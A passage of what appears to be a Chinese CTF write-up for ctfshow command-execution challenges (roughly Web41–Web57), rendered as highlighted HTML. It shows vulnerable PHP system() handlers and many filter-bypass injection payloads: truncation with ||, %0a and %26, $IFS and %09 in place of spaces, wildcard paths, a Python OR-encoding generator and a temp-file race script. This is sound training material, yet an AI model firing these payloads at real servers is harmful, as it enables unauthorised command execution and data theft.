class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    tmp <span class="token operator">=</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">r'[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-'</span><span class="token punctuation">,</span>c<span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>        <span class="token comment">#print(tmp.group(0))</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        a<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token comment"># eval("echo($c);");</span>mya<span class="token operator">=</span><span class="token string">"system"</span>  <span class="token comment">#函数名 这里修改！</span>myb<span class="token operator">=</span><span class="token string">"cat flag.php"</span>      <span class="token comment">#参数</span><span class="token keyword">def</span> <span class="token function">myfun</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>my<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> ans1    <span class="token keyword">global</span> ans2    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">|</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token builtin">ord</span><span class="token punctuation">(</span>my<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                ans1<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                ans2<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>mya<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    myfun<span class="token punctuation">(</span>k<span class="token punctuation">,</span>mya<span class="token punctuation">)</span>data1<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>ans1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>ans2<span class="token operator">+</span><span class="token string">"\")"</span>ans1<span class="token operator">=</span><span class="token string">""</span>ans2<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>myb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    myfun<span class="token punctuation">(</span>k<span class="token punctuation">,</span>myb<span class="token punctuation">)</span>data2<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>ans1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>ans2<span class="token operator">+</span><span class="token string">"\")"</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"c"</span><span class="token punctuation">:</span>data1<span class="token operator">+</span>data2<span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web42"><a href="#Web42" class="headerlink" title="Web42"></a>Web42</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>/dev/null 2&gt;&amp;1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p></blockquote><p>所以不能让后面执行，所以需要把后面截断ls;%0a,后面不用多说了吧,还可以用%26以及||</p><p>ctfshow{0214fa6a-dad0-4619-bc81-58d9fed305e1}</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">c&#x3D;cat flag.php||c&#x3D;cat flag.php%0a(回车)c&#x3D;cat flag.php;%26(&amp;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web43"><a href="#Web43" class="headerlink" title="Web43"></a>Web43</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>;和cat被过滤。用||即可，读取命令有很多，这里不赘述。</p><pre class="line-numbers language-none"><code class="language-none">c&#x3D;tac flag.php||<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/;|cat|flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里过滤了flag，使用通配符即可。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">c&#x3D;nl%20fl*%0a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Web45"><a href="#Web45" class="headerlink" title="Web45"></a>Web45</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| /i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里过滤了空格。</p><p>多过滤了一个空格，总所周知php环境下可以用%09代题空格<br>c=nl%09fl*%0a<br>或者使用内联执行<br>c=echo<code>nl\$IFS*</code>%0A</p><h2 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里多过滤了数字，*。我们可以使用通配符?，同时还可以使用’’””</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">c&#x3D;nl%09fla?????||c&#x3D;nl%09fla&#39;&#39;g.php||c&#x3D;nl%09fla&quot;&quot;g.php||<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web47，48"><a href="#Web47，48" class="headerlink" title="Web47，48"></a>Web47，48</h2><p>多过滤一些命令。上面的payload仍可以使用。</p><h2 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h2><pre class="line-numbers language-none"><code class="language-none">payload1:c&#x3D;nl%09fla\g.php||spayload2:c&#x3D;nl%09fla\g.php%0apayload3:c&#x3D;nl%09fla&#39;&#39;g.php%0apayload4:c&#x3D;nl%09fla&quot;&quot;g.php%0apayload5:c&#x3D;vi%09fla\g.php%0apayload6:c&#x3D;tac%09fla\g.php%0apayload7:c&#x3D;uniq%09fla\g.php%0apayload8:c&#x3D;nl&lt;fla&#39;&#39;g.php||payload9:c&#x3D;nl%09fla\g.php%26<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h2><p>过滤了%09</p><p>c=nl&lt;fla’’g.php||</p><h2 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h2><p>过滤了%问题不大用上一个。</p><h2 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h2><p>|cat|flag| |[0-9]|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\x09|\x26|&gt;|&lt;/i</p><p>过滤一些空格字符，但是$没有被过滤。</p><pre class="line-numbers language-none"><code class="language-none">c&#x3D;nl$IFS\fla?????||c&#x3D;nl$&#123;IFS&#125;\fla?????||<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>flag为假，我们看一下根目录</p><p>c=nl${IFS}/</p><p>之后，查看flag：c=nl${IFS}/fla’’g||</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里不用截断了。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">nl$IFS\fla?????c&#x3D;nl$&#123;IFS&#125;\fla?????<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="Web54"><a href="#Web54" class="headerlink" title="Web54"></a>Web54</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-07 19:43:42# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤了一些常用的查看命令，但是我们可以使用通配符。</p><blockquote><p>这里是使用的cat命令 cat命令是存在/bin/cat 因为默认配置了环境变量使用才可以直接使用cat 但是实际上cat是可以使用 /bin/cat.</p></blockquote><p>所以payolad为 /bin/c??$IFS????????</p><h2 id="Web55-56"><a href="#Web55-56" class="headerlink" title="Web55-56"></a>Web55-56</h2><p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a><br>这题还是去看大佬的文章吧，讲的很清楚。我在这里就该书一下吧。</p><p>首先，我们在post一个文件时，操作系统会将其暂时储存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。</p><p>而在linux中.可以执行文件。于是，我们可以post文件的同时，去调用这个文件，从而形成条件竞争。而文件中的内容便可以是，获取flag的命令。</p><p>下面给出脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://f2b03d51-a47b-4e19-88d5-f400b8e6a711.challenge.ctf.show/?c=.+/???/????????[@-[]"</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span> <span class="token string">b'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-05 20:49:30# @Last Modified by:   h1xa# @Last Modified time: 2020-09-08 01:02:56# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token comment">// 还能炫的动吗？</span><span class="token comment">//flag in 36.php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat "</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个题的目的就是构造36，这里没有过滤$，我们知道$一般代表变量。</p><p>而在linux中，$(())代表数学运算。可以看到，$(())为0，$((~$(())))为-1，所以我们可以先相加再取反</p><pre class="line-numbers language-linux" data-language="linux"><code class="language-linux">[root@VM-16-16-centos ~]# echo $(())0[root@VM-16-16-centos ~]# echo ~$(())~0[root@VM-16-16-centos ~]# echo $(( ~$(())))-1[root@VM-16-16-centos ~]# echo ~$(($(( ~$(())))+$(( ~$(())))))~-2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span> <span class="token operator">~</span>$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span 